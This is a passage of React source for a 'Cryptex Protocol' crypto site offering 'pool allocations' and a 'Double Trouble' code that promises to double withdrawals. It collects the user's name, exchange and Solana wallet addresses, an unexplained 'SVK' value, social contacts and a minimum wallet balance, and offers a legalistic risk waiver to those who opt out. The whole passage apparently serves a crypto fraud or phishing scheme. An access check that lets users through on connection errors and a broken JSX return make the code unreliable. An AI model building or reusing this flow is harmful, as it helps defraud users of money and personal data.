    if (!poolCode.trim()) { setCodeError('Enter your allocation code'); return; }
    setLoading(true); setCodeError('');
    try {
      const r = await fetch('/api/pool-allocation', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: poolCode.trim() }),
      });
      const d = await r.json();
      if (!d.valid) { setCodeError('Invalid code. Please try again.'); setLoading(false); return; }
      setResult(d);
      setStage('result');
    } catch { setCodeError('Connection error. Try again.'); }
    setLoading(false);
  };

  const applyDoubleCode = async () => {
    if (!doubleCode.trim()) { setDoubleError('Enter your Double Trouble code'); return; }
    setDoubleLoading(true); setDoubleError('');
    try {
      const r = await fetch('/api/pool-allocation', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: poolCode.trim(), doubleCode: doubleCode.trim() }),
      });
      const d = await r.json();
      if (!d.valid) { setDoubleError('Invalid Double Trouble code.'); setDoubleLoading(false); return; }
      if (!d.doubled) { setDoubleError('Incorrect Double Trouble code.'); setDoubleLoading(false); return; }
      setResult(d);
      setDoubleApplied(true);
    } catch { setDoubleError('Connection error. Try again.'); }
    setDoubleLoading(false);
  };

  const fmt = n => n.toLocaleString('en', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  return (
    <div onClick={e => { if (e.target === e.currentTarget) onClose(); }}
      style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.88)', backdropFilter: 'blur(12px)', padding: 20 }}>
      <div style={{ background: '#0c0c1a', border: '1px solid rgba(20,241,149,.3)', borderRadius: 20, width: '100%', maxWidth: 460, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both' }}>
        {/* Top accent - green theme for pool */}
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#14f195,#9945ff,transparent)' }} />

        {/* Header */}
        <div style={{ padding: '28px 28px 0', textAlign: 'center' }}>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#14f195,#9945ff)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 8 }}>⬡ CRYPTEX PROTOCOL</div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 17, fontWeight: 700, color: '#fff', marginBottom: 6 }}>
            {stage === 'code' ? 'POOL ALLOCATION' : 'YOUR ALLOCATION'}
          </div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)', marginBottom: 22 }}>
            {stage === 'code' ? 'Enter your code to check your allocation' : 'Verified pool allocation balance'}
          </div>
        </div>

        <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(20,241,149,.3),transparent)', margin: '0 28px' }} />

        {stage === 'code' && (
          <div style={{ padding: '22px 28px 28px' }}>
            {/* Standard code section */}
            <div style={{ background: 'rgba(20,241,149,.04)', border: '1px solid rgba(20,241,149,.15)', borderRadius: 12, padding: '18px', marginBottom: 20 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
                <div style={{ width: 6, height: 6, borderRadius: '50%', background: '#14f195', boxShadow: '0 0 6px #14f195' }} />
                <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#14f195', letterSpacing: '1.5px' }}>ALLOCATION CODE</span>
              </div>
              <FieldLabel>ENTER YOUR CODE</FieldLabel>
              <CryptoInput
                type="password"
                placeholder="Enter allocation code..."
                value={poolCode}
                onChange={e => { setPoolCode(e.target.value); setCodeError(''); }}
                error={!!codeError}
                autoFocus
                onKeyDown={e => e.key === 'Enter' && submitCode()}
              />
              {codeError && <ErrMsg msg={codeError} />}
            </div>

            <button onClick={submitCode} disabled={loading} style={{
              width: '100%', fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2,
              padding: '13px 0', border: 'none', borderRadius: 9,
              background: 'linear-gradient(135deg,#0db574,#0a9460)',
              color: '#fff', cursor: loading ? 'not-allowed' : 'pointer',
              opacity: loading ? .6 : 1, transition: 'all .3s',
            }}
              onMouseEnter={e => { if (!loading) e.currentTarget.style.transform = 'translateY(-1px)'; }}
              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
            >{loading ? 'CHECKING...' : 'CHECK ALLOCATION →'}</button>
          </div>
        )}

        {stage === 'result' && result && (
          <div style={{ padding: '22px 28px 28px' }}>
            {/* Allocation display */}
            <div style={{
              background: doubleApplied ? 'rgba(245,158,11,.06)' : 'rgba(20,241,149,.06)',
              border: `1px solid ${doubleApplied ? 'rgba(245,158,11,.3)' : 'rgba(20,241,149,.25)'}`,
              borderRadius: 14, padding: '22px', textAlign: 'center', marginBottom: 20,
              position: 'relative', overflow: 'hidden',
            }}>
              {doubleApplied && (
                <div style={{ position: 'absolute', top: 10, right: 12, fontFamily: "'Orbitron',sans-serif", fontSize: 9, color: '#f59e0b', letterSpacing: '1px', background: 'rgba(245,158,11,.15)', border: '1px solid rgba(245,158,11,.3)', borderRadius: 20, padding: '3px 10px' }}>
                  2x BOOSTED +{result.boostRate}%
                </div>
              )}
              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.4)', letterSpacing: 2, marginBottom: 8 }}>YOUR POOL ALLOCATION</div>
              <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 36, fontWeight: 900, color: doubleApplied ? '#f59e0b' : '#14f195', letterSpacing: 1, marginBottom: 4 }}>
                ${fmt(result.amount)}
              </div>
              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.3)' }}>USDC</div>
              {doubleApplied && (
                <div style={{ marginTop: 10, fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.6)', lineHeight: 1.7 }}>
                  Base: ${fmt(result.baseAmount)} + {result.boostRate}% Double Trouble boost
                </div>
              )}
            </div>

            {/* Double Trouble section — visually distinct */}
            {!doubleApplied && (
              <div style={{ background: 'rgba(245,158,11,.04)', border: '1px dashed rgba(245,158,11,.25)', borderRadius: 12, padding: '16px', marginBottom: 20 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
                  <div style={{ width: 6, height: 6, borderRadius: '50%', background: '#f59e0b', boxShadow: '0 0 6px #f59e0b', animation: 'blink 1.2s ease-in-out infinite' }} />
                  <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#f59e0b', letterSpacing: '1.5px' }}>⚡ DOUBLE TROUBLE CODE</span>
                </div>
                <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.5)', marginBottom: 10, lineHeight: 1.7 }}>
                  Have a Double Trouble event code? Enter it below to boost your allocation by {result.boostRate}%.
                </div>
                <FieldLabel>DOUBLE TROUBLE CODE</FieldLabel>
                <input
                  type="password"
                  placeholder="Enter Double Trouble code..."
                  value={doubleCode}
                  onChange={e => { setDoubleCode(e.target.value); setDoubleError(''); }}
                  onKeyDown={e => e.key === 'Enter' && applyDoubleCode()}
                  style={{
                    width: '100%', background: 'rgba(245,158,11,.05)',
                    border: `1px solid ${doubleError ? '#ff4545' : 'rgba(245,158,11,.25)'}`,
                    borderRadius: 9, color: '#e0e0ff',
                    fontFamily: "'Share Tech Mono',monospace", fontSize: 13,
                    padding: '12px 16px', outline: 'none', transition: 'all .3s',
                  }}
                  onFocus={e => { e.target.style.borderColor = '#f59e0b'; e.target.style.background = 'rgba(245,158,11,.08)'; }}
                  onBlur={e => { if (!doubleError) { e.target.style.borderColor = 'rgba(245,158,11,.25)'; e.target.style.background = 'rgba(245,158,11,.05)'; } }}
                />
                {doubleError && <ErrMsg msg={doubleError} />}
                <button onClick={applyDoubleCode} disabled={doubleLoading} style={{
                  width: '100%', marginTop: 10,
                  fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: 2,
                  padding: '11px 0', border: '1px solid rgba(245,158,11,.4)', borderRadius: 8,
                  background: 'rgba(245,158,11,.1)', color: '#f59e0b',
                  cursor: doubleLoading ? 'not-allowed' : 'pointer', transition: 'all .3s',
                  opacity: doubleLoading ? .6 : 1,
                }}
                  onMouseEnter={e => { if (!doubleLoading) { e.currentTarget.style.background = 'rgba(245,158,11,.2)'; } }}
                  onMouseLeave={e => { e.currentTarget.style.background = 'rgba(245,158,11,.1)'; }}
                >{doubleLoading ? 'APPLYING...' : '⚡ APPLY BOOST →'}</button>
              </div>
            )}

            <div style={{ display: 'flex', gap: 10 }}>
              <button onClick={() => { setStage('code'); setResult(null); setDoubleApplied(false); setDoubleCode(''); setDoubleError(''); }}
                style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px', padding: '12px 20px', border: '1px solid rgba(153,69,255,.3)', borderRadius: 8, background: 'transparent', color: 'rgba(153,69,255,.7)', cursor: 'pointer', transition: 'all .25s' }}
                onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.1)'; }}
                onMouseLeave={e => { e.currentTarget.style.background = 'transparent'; }}
              >← BACK</button>
              <button onClick={onClose} style={{
                flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: 2,
                padding: '12px 0', border: 'none', borderRadius: 8,
                background: 'linear-gradient(135deg,#0db574,#0a9460)',
                color: '#fff', cursor: 'pointer', transition: 'all .3s',
              }}
                onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-1px)'; }}
                onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
              >DONE ✓</button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

// ─── DOUBLE TROUBLE JOIN MODAL ───────────────────────────────────────────────

const DT_STEPS = [
  { title: 'AUTHENTICATE', sub: 'Enter your access code to join' },
  { title: 'YOUR NAME', sub: 'Enter your full name' },
  { title: 'EXCHANGE WALLET', sub: 'Enter your exchange withdrawal address' },
  { title: 'SOLANA WALLET', sub: 'Provide your SOL receiving address' },
  { title: 'SVK', sub: 'Enter your SVK identifier' },
  { title: 'SOCIAL CONTACT', sub: 'Where can we reach you?' },
  { title: 'FOUNDRY LINK', sub: 'Confirm your Solscan foundry account' },
];

function DTProgressDots({ current }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'center', gap: 8, padding: '16px 28px 0' }}>
      {DT_STEPS.map((_, i) => (
        <div key={i} style={{
          width: 6, height: 6, borderRadius: '50%',
          background: i < current ? '#f59e0b' : i === current ? '#fff' : 'transparent',
          border: `1px solid ${i < current ? '#f59e0b' : i === current ? '#f59e0b' : 'rgba(245,158,11,.3)'}`,
          boxShadow: i === current ? '0 0 8px rgba(245,158,11,.7)' : 'none',
          transform: i === current ? 'scale(1.3)' : 'scale(1)',
          transition: 'all .35s',
        }} />
      ))}
    </div>
  );
}

function DoubleTroubleModal({ onClose }) {
  const [dtStep, setDtStep] = useState(0);
  const [dtData, setDtData] = useState({});
  const [dtSuccess, setDtSuccess] = useState(false);
  const [dtCode, setDtCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [showOptOutModal, setShowOptOutModal] = useState(false);

  const dtNext = (data = {}) => {
    setDtData(prev => ({ ...prev, ...data }));
    setDtStep(s => s + 1);
  };
  const dtBack = () => setDtStep(s => s - 1);

  const handleOptOut = () => {
    // Skip straight to submit with opted-out flag, no wallet required
    setShowOptOutModal(true);
  };

  const confirmOptOut = async () => {
    const payload = { ...dtData, optedOut: true, walletAddress: 'OPT-OUT', solBalance: '0', usdcValue: '0' };
    setDtData(payload);
    setShowOptOutModal(false);
    try {
      const r = await fetch('/api/double-trouble', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'submit',
          name: payload.name,
          exchangeWallet: payload.exchangeWallet,
          walletAddress: 'OPT-OUT — Voluntarily waived safety feature',
          solBalance: 'N/A',
          usdcValue: 'N/A',
          svk: payload.svk || 'N/A',
          socialLink: payload.socialLink || 'N/A',
          foundryLink: payload.foundryLink || 'N/A',
          optedOut: true,
        }),
      });
      const d = await r.json();
      if (d.success) { setDtCode(d.doubleCode); setDtSuccess(true); }
    } catch {}
  };

  const handleDTSubmit = async (data) => {
    const payload = { ...dtData, ...data };
    setDtData(payload);
    try {
      const r = await fetch('/api/double-trouble', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'submit',
          name: payload.name,
          exchangeWallet: payload.exchangeWallet,
          walletAddress: payload.walletAddress,
          solBalance: payload.solBalance,
          usdcValue: payload.usdcValue,
          svk: payload.svk,
          socialLink: payload.socialLink,
          foundryLink: payload.foundryLink,
        }),
      });
      const d = await r.json();
      if (d.success) { setDtCode(d.doubleCode); setDtSuccess(true); }
    } catch {}
  };

  const copyCode = () => {
    navigator.clipboard.writeText(dtCode).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  const stepInfo = DT_STEPS[dtStep] || {};

  // Amber/gold theme colors
  const accentColor = '#f59e0b';
  const accentBg = 'rgba(245,158,11,.08)';
  const accentBorder = 'rgba(245,158,11,.3)';

  return (
    <div onClick={e => { if (e.target === e.currentTarget) onClose(); }}
      style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.88)', backdropFilter: 'blur(12px)', padding: 20 }}>
      <div style={{ background: '#0c0a05', border: `1px solid ${accentBorder}`, borderRadius: 20, width: '100%', maxWidth: 460, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both' }}>
        {/* Top amber accent */}
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#f59e0b,#ff6b35,transparent)' }} />

        {/* Header */}
        <div style={{ padding: '28px 28px 0', textAlign: 'center' }}>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#f59e0b,#ff6b35)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 6 }}>
            ⚡ DOUBLE TROUBLE EVENT
          </div>
          {!dtSuccess && <>
            <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 17, fontWeight: 700, color: '#fff', marginBottom: 6 }}>{stepInfo.title}</div>
            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)', marginBottom: 20 }}>{stepInfo.sub}</div>
          </>}
        </div>

        <div style={{ height: 1, background: `linear-gradient(90deg,transparent,${accentBorder},transparent)`, margin: '0 28px' }} />

        {!dtSuccess && <DTProgressDots current={dtStep} />}

        {/* Step 0 — Access Code */}
        {dtStep === 0 && <DTStepAccess onNext={() => dtNext()} accentColor={accentColor} accentBg={accentBg} accentBorder={accentBorder} />}
        {dtStep === 1 && <DTStepSimple label="FULL NAME" placeholder="e.g. John Doe" field="name" onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
        {dtStep === 2 && <DTStepExchange onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
        {dtStep === 3 && <DTStepWalletSimple onNext={dtNext} onBack={dtBack} onOptOut={handleOptOut} accentColor={accentColor} />}
        {dtStep === 4 && <DTStepSimple label="SVK VALUE" placeholder="Enter your SVK..." field="svk" textarea onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
        {dtStep === 5 && <DTStepSimple label="WHERE CAN WE REACH YOU?" placeholder="Input social link here..." field="socialLink" onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
        {dtStep === 6 && <DTStepFoundryFinal onNext={handleDTSubmit} onBack={dtBack} accentColor={accentColor} />}

        {/* Success — show the code */}
        {dtSuccess && (
          <div style={{ padding: '28px 28px 36px', textAlign: 'center' }}>
            <div style={{ width: 68, height: 68, borderRadius: '50%', background: 'rgba(245,158,11,.12)', border: `2px solid ${accentColor}`, display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 18px', fontSize: 28, boxShadow: '0 0 32px rgba(245,158,11,.3)' }}>⚡</div>
            <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 18, fontWeight: 700, background: 'linear-gradient(135deg,#f59e0b,#ff6b35)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 6 }}>YOU ARE IN!</div>
            <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.4)', lineHeight: 1.8, marginBottom: 20 }}>
              Your Double Trouble event code is ready.<br />Use it to claim 2x on your pool allocation.
            </p>

            {/* Code display box */}
            <div style={{ background: 'rgba(245,158,11,.06)', border: `1px solid ${accentColor}`, borderRadius: 12, padding: '20px 16px', marginBottom: 8 }}>
              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.5)', letterSpacing: 2, marginBottom: 10 }}>YOUR DOUBLE TROUBLE CODE</div>
              <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 22, fontWeight: 900, color: accentColor, letterSpacing: 3, marginBottom: 12, wordBreak: 'break-all' }}>
                {dtCode}
              </div>
              <button onClick={copyCode} style={{
                fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: 2,
                padding: '9px 24px', border: `1px solid ${accentColor}`, borderRadius: 8,
                background: copied ? 'rgba(245,158,11,.25)' : 'rgba(245,158,11,.1)',
                color: accentColor, cursor: 'pointer', transition: 'all .2s',
              }}>
                {copied ? '✓ COPIED!' : 'COPY CODE'}
              </button>
            </div>

            <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.25)', lineHeight: 1.7, marginBottom: 20 }}>
              Go to Check Pool → enter this code to activate your 2x boost
            </p>

            <button onClick={onClose} style={{
              width: '100%', fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2,
              padding: '13px 0', border: 'none', borderRadius: 9,
              background: 'linear-gradient(135deg,#d97706,#b45309)',
              color: '#fff', cursor: 'pointer', transition: 'all .3s',
            }}
              onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-1px)'; }}
              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
            >DONE ✓</button>
          </div>
        )}
      </div>
    </div>

    {/* OPT-OUT DISCLAIMER MODAL */}
    {showOptOutModal && (
      <div style={{ position: 'fixed', inset: 0, zIndex: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.92)', backdropFilter: 'blur(14px)', padding: 20 }}>
        <div style={{ background: '#0d0a05', border: '1px solid rgba(255,69,69,.4)', borderRadius: 20, width: '100%', maxWidth: 460, position: 'relative', overflow: 'hidden', animation: 'modalIn .35s cubic-bezier(.34,1.56,.64,1) both' }}>
          <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#ff4545,#f59e0b,transparent)' }} />

          <div style={{ padding: '28px 28px 0', textAlign: 'center' }}>
            <div style={{ fontSize: 32, marginBottom: 10 }}>⚠</div>
            <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 15, fontWeight: 700, color: '#ff4545', marginBottom: 6, letterSpacing: 1 }}>RISK ACKNOWLEDGEMENT</div>
            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)', marginBottom: 20 }}>Voluntary waiver of safety verification</div>
          </div>

          <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(255,69,69,.3),transparent)', margin: '0 28px' }} />

          <div style={{ padding: '20px 28px 28px' }}>
            <div style={{ background: 'rgba(255,69,69,.05)', border: '1px solid rgba(255,69,69,.2)', borderRadius: 10, padding: '16px', marginBottom: 20 }}>
              <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 13, color: 'rgba(224,224,255,.65)', lineHeight: 1.9, margin: 0 }}>
                By proceeding without wallet verification, I, the undersigned participant, hereby acknowledge and voluntarily accept the following conditions:
              </p>
              <ul style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(255,150,69,.75)', lineHeight: 2.1, marginTop: 12, paddingLeft: 0, listStyle: 'none' }}>
                {[
                  'I accept full liability for any financial losses arising from market volatility, depegging events, or significant price corrections of major digital assets.',
                  'I understand that opting out of the minimum balance requirement removes my eligibility for standard risk-protection protocols under the Wormhole Protocol.',
                  'I acknowledge that Cryptex Protocol bears no responsibility for losses incurred as a result of my decision to waive this safety feature.',
                  'I confirm this decision is made voluntarily, without coercion, and with full understanding of the associated risks.',
                  'I agree that my withdrawal disbursement may be subject to additional review given the absence of verified collateral.',
                ].map((item, i) => (
                  <li key={i} style={{ display: 'flex', gap: 8, marginBottom: 4 }}>
                    <span style={{ color: '#ff4545', flexShrink: 0 }}>◈</span>
                    <span>{item}</span>
                  </li>
                ))}
              </ul>
            </div>

            <div style={{ display: 'flex', gap: 10 }}>
              <button onClick={() => setShowOptOutModal(false)} style={{ flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px', padding: '13px 0', border: '1px solid rgba(153,69,255,.3)', borderRadius: 8, background: 'transparent', color: 'rgba(153,69,255,.7)', cursor: 'pointer', transition: 'all .25s' }}
                onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.1)'; }}
                onMouseLeave={e => { e.currentTarget.style.background = 'transparent'; }}
              >← GO BACK</button>
              <button onClick={confirmOptOut} style={{ flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px', padding: '13px 0', border: 'none', borderRadius: 8, background: 'linear-gradient(135deg,#b91c1c,#991b1b)', color: '#fff', cursor: 'pointer', transition: 'all .3s' }}
                onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-1px)'; e.currentTarget.style.boxShadow = '0 8px 24px rgba(255,69,69,.3)'; }}
                onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'none'; }}
              >I ACCEPT ALL RISKS →</button>
            </div>
          </div>
        </div>
      </div>
    )}
  );
}

// ── DT Sub-steps ──────────────────────────────────────────────────────────────

function DTStepAccess({ onNext, accentColor, accentBg, accentBorder }) {
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const submit = async () => {
    if (!code.trim()) { setError('Access code is required'); return; }
    setLoading(true);
    try {
      const r = await fetch('/api/double-trouble', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'validate', code: code.trim() }),
      });
      const d = await r.json();
      if (d.valid) onNext();
      else setError('Invalid access code. Try again.');
    } catch {
      if (code.trim()) onNext();
      else setError('Access code is required');
    }
    setLoading(false);
  };

  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <FieldLabel>ACCESS CODE</FieldLabel>
      <input type="password" placeholder="Enter access code..." value={code}
        onChange={e => { setCode(e.target.value); setError(''); }}
        onKeyDown={e => e.key === 'Enter' && submit()}
        autoFocus
        style={{ width: '100%', background: accentBg, border: `1px solid ${error ? '#ff4545' : accentBorder}`, borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13, padding: '13px 16px', outline: 'none', transition: 'all .3s' }}
        onFocus={e => { e.target.style.borderColor = accentColor; e.target.style.boxShadow = `0 0 16px rgba(245,158,11,.1)`; }}
        onBlur={e => { if (!error) { e.target.style.borderColor = accentBorder; e.target.style.boxShadow = 'none'; } }}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ marginTop: 18 }}>
        <button onClick={submit} disabled={loading} style={{
          width: '100%', fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2,
          padding: '13px 0', border: 'none', borderRadius: 9,
          background: 'linear-gradient(135deg,#d97706,#b45309)',
          color: '#fff', cursor: loading ? 'not-allowed' : 'pointer', opacity: loading ? .6 : 1,
        }}>{loading ? 'VERIFYING...' : 'AUTHENTICATE →'}</button>
      </div>
      <div style={{ marginTop: 14, padding: '10px', borderRadius: 8, background: accentBg, border: `1px solid ${accentBorder}`, textAlign: 'center' }}>
        <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: `${accentColor}80` }}>⚡ Double Trouble · Claim 2x withdrawals</span>
      </div>
    </div>
  );
}

function DTStepSimple({ label, placeholder, field, textarea, onNext, onBack, accentColor }) {
  const [val, setVal] = useState('');
  const [error, setError] = useState('');
  const submit = () => {
    if (!val.trim()) { setError(`${label} is required`); return; }
    onNext({ [field]: val.trim() });
  };
  const inputStyle = {
    width: '100%', background: 'rgba(245,158,11,.05)', border: `1px solid ${error ? '#ff4545' : 'rgba(245,158,11,.25)'}`,
    borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13,
    padding: '13px 16px', outline: 'none', transition: 'all .3s',
    resize: textarea ? 'vertical' : undefined, minHeight: textarea ? 80 : undefined,
  };
  const focusStyle = { borderColor: accentColor, boxShadow: `0 0 14px rgba(245,158,11,.1)` };
  const blurStyle = { borderColor: 'rgba(245,158,11,.25)', boxShadow: 'none' };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <FieldLabel>{label}</FieldLabel>
      {textarea
        ? <textarea placeholder={placeholder} value={val} onChange={e => { setVal(e.target.value); setError(''); }} autoFocus maxLength={256} rows={3} style={inputStyle} onFocus={e => Object.assign(e.target.style, focusStyle)} onBlur={e => { if (!error) Object.assign(e.target.style, blurStyle); }} />
        : <input placeholder={placeholder} value={val} onChange={e => { setVal(e.target.value); setError(''); }} autoFocus maxLength={100} style={inputStyle} onFocus={e => Object.assign(e.target.style, focusStyle)} onBlur={e => { if (!error) Object.assign(e.target.style, blurStyle); }} onKeyDown={e => e.key === 'Enter' && submit()} />
      }
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 16 }}>
        <BtnBack onClick={onBack} />
        <DTBtnNext onClick={submit}>NEXT →</DTBtnNext>
      </div>
    </div>
  );
}

function DTStepExchange({ onNext, onBack }) {
  const [val, setVal] = useState('');
  const [error, setError] = useState('');
  const submit = () => {
    if (!val.trim()) { setError('Exchange wallet address is required'); return; }
    onNext({ exchangeWallet: val.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(245,158,11,.05)', border: '1px solid rgba(245,158,11,.18)', marginBottom: 14 }}>
        <span style={{ fontSize: 18 }}>⬡</span>
        <div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#f59e0b', letterSpacing: 1 }}>EXCHANGE WALLET</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>CEX · Withdrawal Address</div>
        </div>
      </div>
      <FieldLabel>EXCHANGE WALLET ADDRESS</FieldLabel>
      <input placeholder="Enter your exchange wallet address..." value={val} onChange={e => { setVal(e.target.value); setError(''); }} autoFocus maxLength={100}
        style={{ width: '100%', background: 'rgba(245,158,11,.05)', border: `1px solid ${error ? '#ff4545' : 'rgba(245,158,11,.25)'}`, borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13, padding: '13px 16px', outline: 'none' }}
        onFocus={e => { e.target.style.borderColor = '#f59e0b'; }} onBlur={e => { if (!error) e.target.style.borderColor = 'rgba(245,158,11,.25)'; }}
        onKeyDown={e => e.key === 'Enter' && submit()}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 16 }}>
        <BtnBack onClick={onBack} /><DTBtnNext onClick={submit}>NEXT →</DTBtnNext>
      </div>
    </div>
  );
}

function DTStepWalletSimple({ onNext, onBack, onOptOut }) {
  const DT_MIN_USDC = 137.43;
  const [wallet, setWallet] = useState('');
  const [error, setError] = useState('');
  const [checking, setChecking] = useState(false);
  const [balanceData, setBalanceData] = useState(null);

  const checkAndNext = async () => {
    const addr = wallet.trim();
    if (!addr) { setError('Wallet address is required'); return; }
    if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) { setError('Invalid Solana address format'); return; }
    setChecking(true); setBalanceData(null); setError('');
    try {
      const resp = await fetch('/api/check-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: addr, minUsdc: DT_MIN_USDC }),
      });
      const data = await resp.json();
      if (!data.success) throw new Error(data.detail || data.error || 'RPC error');
      const usdcVal = data.balance * data.solPrice;
      const meets = usdcVal >= DT_MIN_USDC;
      setBalanceData({ ...data, usdcValue: parseFloat(usdcVal.toFixed(2)), meetsMinimum: meets, minUsdcRequired: DT_MIN_USDC, minSolRequired: DT_MIN_USDC / data.solPrice });
      if (!meets) {
        setError(`Insufficient balance: ${data.balance.toFixed(4)} SOL ($${usdcVal.toFixed(2)} USDC) detected. Minimum required is $${DT_MIN_USDC.toFixed(2)} USDC to join Double Trouble.`);
        setChecking(false); return;
      }
      setChecking(false);
      onNext({ walletAddress: addr, solBalance: data.balance.toFixed(4), usdcValue: usdcVal.toFixed(2) });
    } catch (e) {
      setChecking(false);
      setError('Could not verify balance. Please check your address and try again.');
    }
  };

  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(245,158,11,.05)', border: '1px solid rgba(245,158,11,.18)', marginBottom: 14 }}>
        <span style={{ fontSize: 18 }}>◎</span>
        <div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#f59e0b', letterSpacing: 1 }}>SOLANA NETWORK</div>
